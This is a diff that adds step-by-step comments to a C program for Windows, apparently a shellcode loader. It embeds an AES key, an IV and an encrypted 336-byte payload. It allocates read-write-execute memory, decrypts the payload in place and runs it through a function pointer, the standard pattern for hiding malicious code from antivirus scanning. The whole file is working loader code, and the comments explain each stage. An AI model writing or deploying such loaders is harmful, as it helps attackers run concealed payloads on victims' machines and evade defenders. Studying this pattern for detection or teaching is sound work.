@@ -1,3 +1,5 @@
+/* Using AES to decrypt an encrypted payload using a key that is already located in memory. */
+
 #include <Windows.h>
 #include <stdio.h>
 #include <stdint.h>
@@ -6,6 +8,7 @@
 
 #define AES256 1
 
+// Key used to decrypt
 BYTE key[32] = {
     0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
     0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
@@ -13,13 +16,18 @@ BYTE key[32] = {
     0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f
 };
 
+// Initialization Vector used to decrypt, since we're using CBC
 BYTE iv[16] = {
     0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
     0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
 };
 
+// Size of the encrypted payload. It is padded by 4 bytes of encrypted noops to 
+// make it a multiple of 16, since the tiny_aes library does not support padding
+// intrinsically.
 SIZE_T len = 336;
 
+// The encrypted payload that will be deployed
 BYTE encrypted_payload[] = {
 0x12,0x4c,0x77,0x2d,0xf2,0x74,0x20,0x31,0x8a,0xb1,0xae,0x8f,0xe4,0x75,0xb3,0xdb,
 0xff,0x16,0x12,0x22,0x57,0x90,0xde,0x2f,0x74,0x0b,0xe8,0x4d,0x56,0xbd,0xc8,0x5b,
@@ -48,20 +56,26 @@ BYTE encrypted_payload[] = {
 int main() {
     SIZE_T len = sizeof(encrypted_payload);
 
+    // Initialize the context (ctx) for following AES operations
     struct AES_ctx ctx;
     AES_init_ctx_iv(&ctx, key, iv);
 
+    // Allocate memory that has read, write, and execute permission.
     void* executable_memory = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!executable_memory) {
         printf("VirtualAlloc failed: %d\n", GetLastError());
         return -1;
     }
 
+    // Copy the encrypted payload into the allocated memory
     memcpy(executable_memory, encrypted_payload, len);
 
+    // Decrypt the payload in place using AES
     AES_CBC_decrypt_buffer(&ctx, executable_memory, len);
 
+    // Run the payload using pointer magic
     ((void(*)()) executable_memory)();
 
+    // Wait for user interaction
     getchar();
 }
